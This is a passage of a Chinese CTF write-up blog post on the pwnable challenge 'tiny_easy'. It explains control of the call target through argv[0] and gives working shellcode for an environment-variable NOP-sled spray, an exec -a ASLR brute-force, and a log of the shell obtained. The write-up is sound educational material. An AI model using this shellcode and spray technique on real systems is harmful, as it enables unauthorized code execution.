<p>原来栈上的数据就是传入参数和环境变量的地址，接下来执行到<code>call edx</code>看看程序会转向哪儿。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x1 </span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0x0 </span><br><span class="line">EDX: 0x6d6f682f (&apos;/hom&apos;)</span><br><span class="line">ESI: 0x0 </span><br><span class="line">EDI: 0x0 </span><br><span class="line">EBP: 0x0 </span><br><span class="line">ESP: 0xffcf23c8 --&gt; 0x0 </span><br><span class="line">EIP: 0x8048058 (call   edx)</span><br><span class="line">EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x8048051:	adc    BYTE PTR [eax],al</span><br><span class="line">   0x8048053:	add    BYTE PTR [eax+0x5a],bl</span><br><span class="line">   0x8048056:	mov    edx,DWORD PTR [edx]</span><br><span class="line">=&gt; 0x8048058:	call   edx</span><br><span class="line">   0x804805a:	add    BYTE PTR [eax],al</span><br><span class="line">   0x804805c:	add    BYTE PTR [eax],al</span><br><span class="line">   0x804805e:	add    BYTE PTR [eax],al</span><br><span class="line">   0x8048060:	add    BYTE PTR [eax],al</span><br></pre></td></tr></table></figure></p>
<p>可以看到<code>edx</code>的值就是第一个传入参数的前4个字节，这里是<code>/hom</code>。如果控制了这4个字节，就控制了程序的流程。<br>但是程序空间中没有调用任何函数代码，所以要getshell只有写入<code>shellcode</code>并跳转执行才可，程序能控制写入的地方只有环境变量和传入参数了，于是可以将shellcode写到这里面。但是题目平台是开启<code>ASLR</code>的，不能确定环境变量和传入参数的地址。这里可以控制程序跳转到一个大致的地址去，然后在环境变量里安排<code>[NOP][shelcode]</code>类似的shellcode，其中<code>nop</code>指令相对于<code>shellcode</code>要非常多，这样当程序执行跳转时一旦跳到<code>nop</code>覆盖的区域就会被引导至<code>shellcode</code>。<br>这个大致的地址可以选取调试时见到的值如<code>0xffcf333d</code>，<code>shellcode</code>可以用pwntools的shellcraft模块生成，于是exp如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入环境变量</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 1 500`; <span class="keyword">do</span> <span class="built_in">export</span> A_<span class="variable">$i</span>=$(python -c <span class="string">'print "\x90"*4096+"jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"'</span>);<span class="keyword">done</span>;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> -a $(python -c <span class="string">"print '\x3d\x33\xcf\xff'"</span>) ./tiny_easy &amp;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">tiny_easy@ubuntu:~$ <span class="keyword">for</span> i <span class="keyword">in</span> `seq 1 500`; <span class="keyword">do</span> <span class="built_in">export</span> A_<span class="variable">$i</span>=$(python -c <span class="string">'print "\x90"*4096+"jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"'</span>);<span class="keyword">done</span>;</span><br><span class="line">tiny_easy@ubuntu:~$ <span class="built_in">exec</span> -a $(python -c <span class="string">"print '\x3d\x33\xcf\xff'"</span>) ./tiny_easy &amp;</span><br><span class="line">[1] 30389</span><br><span class="line">tiny_easy@ubuntu:~$ <span class="built_in">fg</span></span><br><span class="line">-bash: <span class="built_in">fg</span>: job has terminated</span><br><span class="line">[1]+  Segmentation fault      <span class="built_in">exec</span> -a $(python -c <span class="string">"print '\x3d\x33\xcf\xff'"</span>) ./tiny_easy</span><br><span class="line">tiny_easy@ubuntu:~$ <span class="built_in">exec</span> -a $(python -c <span class="string">"print '\x3d\x33\xcf\xff'"</span>) ./tiny_easy &amp;</span><br><span class="line">[1] 5710</span><br><span class="line">tiny_easy@ubuntu:~$ <span class="built_in">exec</span> -a $(python -c <span class="string">"print '\x3d\x33\xcf\xff'"</span>) ./tiny_easy &amp;</span><br><span class="line">[2] 11068</span><br><span class="line">[1]   Segmentation fault      <span class="built_in">exec</span> -a $(python -c <span class="string">"print '\x3d\x33\xcf\xff'"</span>) ./tiny_easy</span><br><span class="line">tiny_easy@ubuntu:~$ <span class="built_in">fg</span></span><br><span class="line"><span class="built_in">exec</span> -a $(python -c <span class="string">"print '\x3d\x33\xcf\xff'"</span>) ./tiny_easy</span><br><span class="line">$ ls</span><br><span class="line">flag  tiny_easy</span><br><span class="line">$ cat flag</span><br><span class="line">What a tiny task :) good job!</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<p>另外，我所参考的writeup实际上还使用了<code>ulimit -s unlimited</code>关闭aslr的方法，但这个漏洞已经在题目平台修补了，可以参考<code>CVE-2016-3672</code>漏洞描述或者<a href="http://www.freebuf.com/vuls/101169.html" target="_blank" rel="noopener">这篇文章</a></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>该题漏洞的利用方法类似<code>heap spray</code>，只不过这是把<code>shellcode</code>布置在环境变量的节区上，该方法以前知道但是到了正真使用的时候却忘了，看来还是要多多练习呀。</p>

          
        
      
    </div>

    

    
    
    

    

    <div>
      
    </div>

    <div>
      
    </div>

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">r00tnb</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">44</span>
                    <span class="site-state-item-name">日志</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-categories">
                  <a href="/categories/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">3</span>
                    <span class="site-state-item-name">分类</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-tags">
                  <a href="/tags/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">5</span>
                    <span class="site-state-item-name">标签</span>
                  </a>
                </div>
              
            </nav>
          

          

          
            <div class="links-of-author motion-element">
              
                <span class="links-of-author-item">
                  <a href="https://github.com/r00tnb" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
                  
                </span>
              
                <span class="links-of-author-item">
                  <a href="mailto:1912971419@qq.com.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  
                </span>
              
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                友情链接
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://meiyoulianjie.com/" title="还没有T_T" target="_blank">还没有T_T</a>
                  </li>
                
              </ul>
            </div>
          

          
            
          
          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">r00tnb</span>

  

  
</div>











<div class="theme-info">
  <div class="powered-by"></div>
  <span class="post-count">博客全站共51.3k字</span>
</div>
        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv" title="总访客量">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
    </span>
  

  
    <span class="site-pv" title="总访问量">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
    </span>
  
</div>









        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    
	
    

    
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>


























  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>



  



  








  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
  
  
  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
  
  <script type="text/javascript">
    var GUEST = ['nick','mail','link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(function (item) {
      return GUEST.indexOf(item)>-1;
    });
    new Valine({
        el: '#comments' ,
        verify: false,
        notify: false,
        appId: 'P8D4CJcWbjzgBylpfKakij6f-gzGzoHsz',
        appKey: 'sGWk5EsR6zF5YIBJ7qqlkMHt',
        placeholder: 'Just go go',
        avatar:'mm',
        meta:guest,
        pageSize:'10' || 10,
        visitor: false
    });
  </script>



  





  

  
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
  <script>AV.initialize("P8D4CJcWbjzgBylpfKakij6f-gzGzoHsz", "sGWk5EsR6zF5YIBJ7qqlkMHt");</script>
  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
          for(var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = document.getElementById(url);
            var countSpan = $(element).find(COUNT_CONTAINER_REF);
            if( countSpan.text() == '') {
              countSpan.text(0);
            }
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            
            counter.save(null, {
              success: function(counter) {
                
                  var $element = $(document.getElementById(url));
                  $element.find('.leancloud-visitors-count').text(counter.get('time'));
                
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            
              var newcounter = new Counter();
              /* Set ACL */
              var acl = new AV.ACL();
              acl.setPublicReadAccess(true);
              acl.setPublicWriteAccess(true);
              newcounter.setACL(acl);
              /* End Set ACL */
              newcounter.set("title", title);
              newcounter.set("url", url);
              newcounter.set("time", 1);
              newcounter.save(null, {
                success: function(newcounter) {
                  var $element = $(document.getElementById(url));
                  $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
                },
                error: function(newcounter, error) {
                  console.log('Failed to create');
                }
              });
            
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>



  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  

  
  

  

  

  

  

  

<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
